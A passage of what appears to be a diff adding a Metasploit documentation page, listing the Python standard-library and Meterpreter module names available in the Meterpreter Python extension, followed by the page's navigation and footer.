+encodings.cp1254
+encodings.cp1255
+encodings.cp1256
+encodings.cp1257
+encodings.cp1258
+encodings.cp424
+encodings.cp437
+encodings.cp500
+encodings.cp720
+encodings.cp737
+encodings.cp775
+encodings.cp850
+encodings.cp852
+encodings.cp855
+encodings.cp856
+encodings.cp857
+encodings.cp858
+encodings.cp860
+encodings.cp861
+encodings.cp862
+encodings.cp863
+encodings.cp864
+encodings.cp865
+encodings.cp866
+encodings.cp869
+encodings.cp874
+encodings.cp875
+encodings.hex_codec
+encodings.hp_roman8
+encodings.idna
+encodings.iso8859_1
+encodings.iso8859_10
+encodings.iso8859_11
+encodings.iso8859_13
+encodings.iso8859_14
+encodings.iso8859_15
+encodings.iso8859_16
+encodings.iso8859_2
+encodings.iso8859_3
+encodings.iso8859_4
+encodings.iso8859_5
+encodings.iso8859_6
+encodings.iso8859_7
+encodings.iso8859_8
+encodings.iso8859_9
+encodings.koi8_r
+encodings.koi8_u
+encodings.latin_1
+encodings.mac_arabic
+encodings.mac_centeuro
+encodings.mac_croatian
+encodings.mac_cyrillic
+encodings.mac_farsi
+encodings.mac_greek
+encodings.mac_iceland
+encodings.mac_latin2
+encodings.mac_roman
+encodings.mac_romanian
+encodings.mac_turkish
+encodings.mbcs
+encodings.palmos
+encodings.ptcp154
+encodings.punycode
+encodings.quopri_codec
+encodings.raw_unicode_escape
+encodings.rot_13
+encodings.string_escape
+encodings.tis_620
+encodings.undefined
+encodings.unicode_escape
+encodings.unicode_internal
+encodings.utf_16
+encodings.utf_16_be
+encodings.utf_16_le
+encodings.utf_32
+encodings.utf_32_be
+encodings.utf_32_le
+encodings.utf_7
+encodings.utf_8
+encodings.utf_8_sig
+encodings.uu_codec
+encodings.zlib_codec
+filecmp
+fileinput
+fnmatch
+formatter
+fpformat
+fractions
+ftplib
+functools
+genericpath
+getopt
+getpass
+gettext
+glob
+gzip
+hashlib
+heapq
+hmac
+htmlentitydefs
+htmllib
+HTMLParser
+httplib
+ihooks
+imaplib
+imghdr
+importlib
+imputil
+inspect
+io
+json
+json.decoder
+json.encoder
+json.scanner
+json.tool
+keyword
+linecache
+locale
+logging
+logging.config
+logging.handlers
+macpath
+macurl2path
+mailbox
+mailcap
+markupbase
+md5
+meterpreter
+meterpreter.core
+meterpreter.elevate
+meterpreter.fs
+meterpreter.incognito
+meterpreter.kiwi
+meterpreter.sys
+meterpreter.tlv
+meterpreter.transport
+meterpreter.user
+meterpreter.extapi
+meterpreter.extapi.adsi
+mhlib
+mimetools
+mimetypes
+MimeWriter
+modulefinder
+multifile
+multiprocessing
+multiprocessing.connection
+multiprocessing.forking
+multiprocessing.heap
+multiprocessing.managers
+multiprocessing.pool
+multiprocessing.process
+multiprocessing.queues
+multiprocessing.reduction
+multiprocessing.sharedctypes
+multiprocessing.synchronize
+multiprocessing.util
+multiprocessing.dummy
+multiprocessing.dummy.connection
+mutex
+netrc
+new
+nntplib
+ntpath
+nturl2path
+numbers
+opcode
+optparse
+os
+os2emxpath
+pdb
+pickle
+pickletools
+pipes
+pkgutil
+platform
+plistlib
+popen2
+poplib
+posixfile
+posixpath
+pprint
+profile
+pstats
+py_compile
+pyclbr
+pydoc
+Queue
+quopri
+random
+re
+repr
+rexec
+rfc822
+rlcompleter
+robotparser
+runpy
+sched
+sets
+sgmllib
+sha
+shelve
+shlex
+shutil
+SimpleHTTPServer
+SimpleXMLRPCServer
+site
+smtplib
+sndhdr
+socket
+SocketServer
+sre
+sre_compile
+sre_constants
+sre_parse
+ssl
+stat
+statvfs
+string
+StringIO
+stringold
+stringprep
+struct
+subprocess
+sunau
+sunaudio
+symbol
+symtable
+sysconfig
+tabnanny
+tarfile
+telnetlib
+tempfile
+textwrap
+this
+threading
+timeit
+toaiff
+token
+tokenize
+trace
+traceback
+types
+urllib
+urllib2
+urlparse
+user
+UserDict
+UserList
+UserString
+uu
+uuid
+warnings
+wave
+weakref
+webbrowser
+whichdb
+wsgiref
+wsgiref.handlers
+wsgiref.headers
+wsgiref.simple_server
+wsgiref.util
+wsgiref.validate
+xdrlib
+xml
+xml.dom
+xml.dom.domreg
+xml.dom.expatbuilder
+xml.dom.minicompat
+xml.dom.minidom
+xml.dom.NodeFilter
+xml.dom.pulldom
+xml.dom.xmlbuilder
+xml.etree
+xml.etree.ElementInclude
+xml.etree.ElementPath
+xml.etree.ElementTree
+xml.parsers
+xml.sax
+xml.sax._exceptions
+xml.sax.handler
+xml.sax.saxutils
+xml.sax.xmlreader
+xmllib
+xmlrpclib
+zipfile</code></pre>
+
+</div> <!-- article-content -->
+
+<div id="footer-nav-bar">
+<div><a href="The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers.html">←prev</a></div><div class="nav-bar-push"><a href="../.././Payloads/msfvenom/How-to-use-msfvenom.html">next→</a></div>
+</div>
+
+</div> <!-- article-box -->
+
+</div> <!-- trunk-box -->
+
+<div id="my-footer">
+<p>Copyright <a href="https://metasploit.com/">Metasploit</a>, 2020</p>
+<p><a href="https://join.slack.com/t/metasploit/shared_invite/enQtOTMxMjg5ODY3NDYxLTYyZTVlNDM1ZTI3ZGQ0YTQ0NmI1YjgxMGEwYzFhOWNiZWQ4NDNmNTE1MWNiYzJhMzgwMGY0ZWY2NTY0MjA2M2I">Slack team - metasploit.slack.com</a></p>
+<p><a href="https://twitter.com/metasploit">#twitter handle - @metasploit</a></p>
+<p><a href="mailto:msfdev@metasploit.com">development questions - msfdev [ @ ] metasploit.com</a></p>
+<p> This site is built with <a href="http://www.unexpected-vortices.com/sw/rippledoc/index.html">Rippledoc</a>, <a href="https://lunrjs.com/">Lunr</a>, and <a href="https://github.com/BLE-LTER/Lunr-Index-and-Search-for-Static-Sites">BLE-LTER</a>.<br/>
+<a href="Python-Extension.md">Pandoc-Markdown source for this page</a><br/>
+(Docs processed by
+<a href="http://www.unexpected-vortices.com/sw/rippledoc/index.html">Rippledoc</a>.)
+</div> <!-- my-footer -->
+
+</div> <!-- main-outer-box -->
+
+</body>
+</html>
